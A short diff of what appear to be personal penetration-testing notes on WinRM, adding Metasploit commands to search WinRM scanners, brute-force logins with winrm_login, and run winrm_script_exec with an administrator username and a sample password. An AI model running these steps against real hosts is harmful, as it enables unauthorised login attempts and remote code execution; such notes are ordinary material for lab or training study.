@@ -23,8 +23,11 @@ Windows Remote Management (WinRM)
 ---
 
 ## msfconsonle
-- use exploit/windows/winrm/winrm_script_exec
-	- set rhosts addr
-	- set force_vbs true
-	- set username administrator
-	- set password tinkerbell
+- `search type:auxiliary winrm` : search for scanner
+- `use auxiliary/scanner/winrm/winrm_login` : brute force
+- `use exploit/windows/winrm/winrm_script_exec`
+	- `set rhosts addr`
+	- `set force_vbs true`
+	- `set username administrator`
+	- `set password tinkerbell`
+- 
